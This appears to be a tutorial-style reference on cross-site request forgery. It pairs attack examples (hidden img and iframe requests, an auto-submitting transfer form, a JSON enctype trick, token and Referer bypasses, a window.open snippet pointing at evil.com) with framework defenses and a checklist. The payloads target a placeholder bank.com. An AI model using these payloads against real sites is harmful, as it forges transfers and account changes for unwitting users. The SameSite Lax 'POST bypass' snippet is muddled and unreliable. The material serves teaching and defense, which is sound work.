Cross-Site Request Forgery (CSRF)

OWASP A01 Broken Access Control · CWE-352 · Force a logged-in user's browser to make unwanted requests to a site they're authenticated on

CSRF exploits the browser's automatic cookie sending. When a user is logged in to bank.com, their session cookie is attached to every request to that domain — even requests triggered by malicious code on a completely different site.

CSRF vs XSS — critical difference
CSRF
Forces the victim's browser to make a request. Attacker can't read the response (no same-origin access). Impact: state-changing actions on behalf of the victim.
XSS
Executes arbitrary JS in the victim's browser context. Attacker CAN read responses, steal tokens, hijack sessions. Impact: full account takeover, data theft.

① GET-based CSRF — simplestHigh

Any state-changing GET endpoint is trivially exploitable — just embed the URL in an img src, link, or iframe. No form needed.

<!-- Victim visits evil.com, this loads automatically --> <img src="https://bank.com/transfer?to=attacker&amount=10000" width="0" height="0"/> <!-- Or an iframe --> <iframe src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none"></iframe> <!-- Or a link the victim clicks --> <a href="https://bank.com/admin/delete-user?id=42">Click here to claim your prize!</a> <!-- Prevention: NEVER use GET for state-changing actions -->
② POST-based CSRF — auto-submitting formHigh

A hidden form on the attacker's page auto-submits via JavaScript when the page loads. The browser sends the POST with the victim's session cookie attached.

<html> <body onload="document.forms[0].submit()"> <form action="https://bank.com/transfer" method="POST" style="display:none"> <input name="to" value="attacker_account"/> <input name="amount" value="10000"/> <input name="currency" value="USD"/> </form> <p>Loading...</p> </body> </html> <!-- The victim sees a loading page for a split second while $10,000 is transferred in the background -->
③ JSON CSRF — Content-Type bypassMedium

APIs that accept JSON but don't check CSRF tokens — some can be exploited if the server ignores Content-Type. A form with enctype=text/plain can craft a near-valid JSON body.

<!-- enctype=text/plain trick for JSON APIs --> <form action="https://api.bank.com/transfer" method="POST" enctype="text/plain"> <input name='{"to":"attacker","amount":10000,"x"' value='"unused"}'> </form> <!-- Body sent: {"to":"attacker","amount":10000,"x"="unused"} --> <!-- If server parses loosely, x field is ignored → CSRF via JSON --> <!-- Better: use fetch() with credentials if CORS allows it --> fetch('https://bank.com/transfer', { method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({to:'attacker', amount:10000}) }) <!-- Only works if bank.com CORS misconfigured with credentials:true -->
④ Stored CSRF — self-propagatingHigh

A CSRF payload stored in the application itself — e.g. in a forum post or user profile. Every user who views the page triggers the forged request automatically.

<!-- Stored in a forum post on bank.com's own forum --> <!-- Every logged-in user who views this post sends a transfer --> <img src="/transfer?to=attacker&amount=100" width="0" height="0"/> <!-- Combined with stored XSS — the most dangerous form: XSS reads the CSRF token → uses it to forge requests → bypasses CSRF protection entirely -->

Even when CSRF tokens are implemented, common mistakes leave them bypassable.

① Token not tied to the session

If the server checks that a token exists and is valid but doesn't verify it belongs to this session, an attacker can use their own token in a CSRF attack.

## Attacker logs in to the same app → gets their own CSRF token ## Uses their own valid token in the forged request targeting the victim POST /transfer Cookie: session=VICTIM_SESSION csrf_token=ATTACKER_OWN_VALID_TOKEN ← different session, same app to=attacker&amount=10000 ## Vulnerable server: checks token is valid → passes! ## Secure server: checks token belongs to this session → fails
② Token in URL (Referer leaks it)

CSRF tokens in query strings get logged in server logs and leak via the Referer header to analytics/third-party scripts on subsequent pages.

## Token in URL — leaks via Referer GET /transfer?csrf_token=secret123&to=alice&amount=100 ## Next request (to analytics): Referer: https://bank.com/transfer?csrf_token=secret123 ## Third-party server sees the token! ## Fix: token in hidden form field or custom header only, never in URL
③ Missing token validation on some methods

CSRF protection applied to POST but not PUT, PATCH, or DELETE. Switching the method bypasses the check.

## POST is protected → switch to PUT PUT /api/user/email Cookie: session=abc123 {"email": "attacker@evil.com"} ## No CSRF check on PUT → succeeds ## Or: method override via hidden field <input name="_method" value="PUT"> ## Some frameworks honor this for CSRF-unprotected verbs
④ Token validation skipped when token absent

The server validates the token if present, but if it's missing entirely — it skips validation. Just omit the token field.

## With wrong token → rejected (validation runs, fails) POST /transfer csrf_token=WRONG&to=attacker&amount=10000 → 403 Forbidden ## With NO token → accepted! (validation skipped) POST /transfer to=attacker&amount=10000 → 200 OK ← CSRF succeeds
⑤ Referer-based CSRF protection bypass

Some apps use the Referer header to check origin instead of a token. Easily bypassed by suppressing or spoofing the Referer.

## Suppress Referer from attacker's page <meta name="referrer" content="no-referrer"/> <!-- Browser sends no Referer header → server allows (fails open) --> ## Or link via HTTPS → HTTP (Referer stripped by spec) <!-- Attacker on HTTPS site → links to HTTP bank.com HTTPS→HTTP Referer is stripped by browser for security --> ## Spoof Referer with crafted URL https://attacker.com/bank.com? <!-- Referer contains "bank.com" → naive check passes -->

The SameSite cookie attribute is the modern browser-level CSRF defense. It controls when cookies are sent on cross-site requests.

SameSite valueCross-site GETCross-site POST formCross-site XHR/fetchCSRF protection
None Cookie sent Cookie sent Cookie sent None — fully vulnerable
Lax Sent (top-level nav) NOT sent NOT sent Partial — POST protected, GET still vulnerable
Strict NOT sent NOT sent NOT sent Full CSRF protection
SameSite=Lax bypass — the 2-minute window

Chrome applies SameSite=Lax by default. But there's a 2-minute exception: cookies set without SameSite are sent on top-level cross-site GET requests for 2 minutes after being set. This is exploitable right after login.

## Lax allows cookies on top-level cross-site GET navigation ## So GET-based CSRF still works with SameSite=Lax: <a href="https://bank.com/transfer?to=attacker&amount=10000">Click</a> <!-- If victim clicks → GET request → cookie sent → CSRF succeeds --> ## Lax + POST bypass via window.open + form submit <script> window.onclick = () => { let w = window.open('https://bank.com/page'); // top-level nav — cookie sent setTimeout(() => { w.location = 'https://evil.com/csrf.html'; // now same window, POST it }, 500); } </script> <!-- Exploits browser state after top-level navigation -->
Subdomain CSRF bypass — cookie scope

If a session cookie is scoped to .bank.com (including subdomains), XSS on any subdomain — even blog.bank.com — can read CSRF tokens and forge requests.

## Cookie with domain=.bank.com is readable from all subdomains ## XSS on blog.bank.com can: ## 1. Read the CSRF token via JS ## 2. Make authenticated requests to bank.com with the valid token ## → Full CSRF bypass even with tokens + SameSite=Strict ## Defense: cookie scope must be exact domain, not .domain
① CSRF tokens — synchronizer token pattern Primary defense
Generate a cryptographically random token per session, embed it in every state-changing form, and verify it server-side on every non-GET request.
## Python / Django (built-in) # In template: <form method="POST"> {% csrf_token %} <input name="amount" value="100"/> </form> # Django verifies automatically — no extra code needed ## Node.js / Express (csurf or csrf package) const csrf = require('csrf'); const tokens = new csrf(); const secret = await tokens.secret(); const token = tokens.create(secret); // Store secret in session, embed token in form // On POST: tokens.verify(secret, req.body._csrf) ## Ruby on Rails (built-in) # application_controller.rb protect_from_forgery with: :exception # Template: <%= csrf_meta_tags %> or <%= form_with ... %> (auto-included) ## Key requirements: # - Random, unpredictable (≥128 bits) # - Tied to the specific session # - Validated on EVERY state-changing request # - Never in URL query string
② SameSite=Strict cookies Modern browser defense
Set session cookies with SameSite=Strict — the browser refuses to send them on any cross-site request. Use alongside CSRF tokens, not instead.
## Set-Cookie response header Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly; Path=/ ## Django SESSION_COOKIE_SAMESITE = 'Strict' SESSION_COOKIE_SECURE = True SESSION_COOKIE_HTTPONLY = True ## Express / Node.js app.use(session({ cookie: { sameSite: 'strict', secure: true, httpOnly: true } })) ## Why not Strict alone? ## Breaks OAuth flows, email magic links, and any external link ## that the user clicks to reach a page requiring login state. ## Use Lax for those flows, Strict for session cookies.
③ Custom request headers (for AJAX / APIs) API defense
Simple forms cannot set custom headers. If your API requires a custom header like X-Requested-With: XMLHttpRequest, cross-origin form POSTs are blocked by the browser's CORS preflight.
## Server: require custom header on all state-changing API calls if (req.headers['x-requested-with'] !== 'XMLHttpRequest') { return res.status(403).json({ error: 'CSRF: missing custom header' }); } ## Client: always include the header in AJAX calls fetch('/api/transfer', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' // ← CSRF defense }, body: JSON.stringify({ to: 'alice', amount: 100 }) }) ## Why this works: simple HTML forms cannot set custom headers. ## Only fetch/XHR from the same origin (or CORS-allowed) can. ## Cross-origin forms POST without this header → blocked.
④ Origin / Referer header validation Defense in depth
Check the Origin header (preferred over Referer — can't be suppressed by meta tag). Reject any request whose Origin doesn't match your site. Use as a secondary check alongside tokens.
## Check Origin header (more reliable than Referer) const origin = req.headers['origin']; const allowed = ['https://bank.com', 'https://www.bank.com']; if (origin && !allowed.includes(origin)) { return res.status(403).json({ error: 'Invalid origin' }); } // Note: if origin is absent (direct requests, same-origin), allow // if origin is present and NOT in allowlist, reject
⑤ Checklist — always do all of these
Never use GET for state-changing actions  ·  CSRF token in every form (hidden field), verified server-side  ·  Token tied to session, unpredictable, ≥128 bits  ·  SameSite=Strict on session cookies  ·  Validate all HTTP methods (not just POST)  ·  Reject requests when token is absent, not just when wrong  ·  Never put CSRF tokens in URLs
